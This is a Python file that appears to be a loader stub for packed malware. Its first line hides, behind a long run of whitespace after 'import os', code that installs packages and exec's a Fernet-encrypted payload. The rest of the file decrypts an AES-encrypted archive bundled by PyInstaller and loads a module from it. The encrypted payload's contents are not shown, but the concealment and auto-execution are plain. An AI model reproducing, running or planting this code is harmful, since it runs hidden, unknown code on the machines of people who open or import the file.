import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'oCFwpe9sjpN_obDN_pozdTKVko2MxFn-8cUMy48DEBg=').decrypt(b'gAAAAABl9HjRhvs9Sl8OiHIMY336JcJMW_Cf0THa9L5DiMjBk56mD23zMnAQ5eBZcLe-JoUQ2T3JHs67RtYYxzkcALnqeTIriaz-i8eFAS4Dn-3P8J4sJMJKRZItvkjO2e2PY7M_dVo5D99TVfJWcreHc9bQwcfXo5W4kmG9wDe_HCxIWlkbBBy6PiDcIHnYovJW9HViu_nq'))
import os, sys, base64, zlib
from pyaes import AESModeOfOperationGCM
from zipimport import zipimporter

zipfile = os.path.join(sys._MEIPASS, "blank.aes")
module = "stub-o"

key = base64.b64decode("%key%")
iv = base64.b64decode("%iv%")

def decrypt(key, iv, ciphertext):
    return AESModeOfOperationGCM(key, iv).decrypt(ciphertext)

if os.path.isfile(zipfile):
    with open(zipfile, "rb") as f:
        ciphertext = f.read()
    ciphertext = zlib.decompress(ciphertext[::-1])
    decrypted = decrypt(key, iv, ciphertext)
    with open(zipfile, "wb") as f:
        f.write(decrypted)
    
    zipimporter(zipfile).load_module(module)
jhghnfvkp